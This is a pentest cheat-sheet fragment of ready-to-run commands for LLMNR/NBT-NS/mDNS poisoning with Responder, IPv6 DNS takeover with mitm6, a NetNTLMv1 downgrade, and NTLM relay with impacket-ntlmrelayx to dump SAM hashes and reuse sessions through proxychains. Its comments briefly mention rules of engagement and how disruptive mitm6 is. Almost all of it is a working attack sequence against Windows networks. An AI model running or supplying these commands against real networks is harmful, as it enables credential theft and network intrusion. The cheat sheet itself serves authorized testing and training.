Poisoning & relay — Responder / ntlmrelayx
++++++++++++++++++++++++++++++++++++++++
nxc smb <ip_address>/24 --gen-relay-list relaytargets.txt    # targets w/o SMB signing
sudo responder -I <iface>                                    # poison LLMNR/NBT-NS/mDNS -> NetNTLMv2
sudo responder -I <iface> --disable-ess --lm                 # downgrade to NetNTLMv1 (shuckable, next fold)
sudo mitm6 -d <domain>                                       # IPv6/DNS takeover -> WPAD/HTTP auth; the trigger when LLMNR/NBT-NS is off but IPv6 isn't
# mitm6 rewrites DNS for the WHOLE segment while it runs — loud, disruptive, and an ROE
# conversation first. Pair it with ntlmrelayx below (-6 / --wh for the WPAD host), and keep
# the run SHORT: everything on the segment is resolving through you until you stop it.
# To RELAY not crack: set SMB=Off + HTTP=Off in Responder.conf (/etc/ or /usr/share/responder/) first, then:
impacket-ntlmrelayx -tf relaytargets.txt -smb2support              # relay in, dump SAM
impacket-ntlmrelayx -t smb://<ip_address> -smb2support -socks      # -socks keeps the session
proxychains4 nxc smb <ip_address>                                  # ride the relayed session
# the binary is proxychains4 — the apt pkg Provides: proxychains but ships NO such binary.
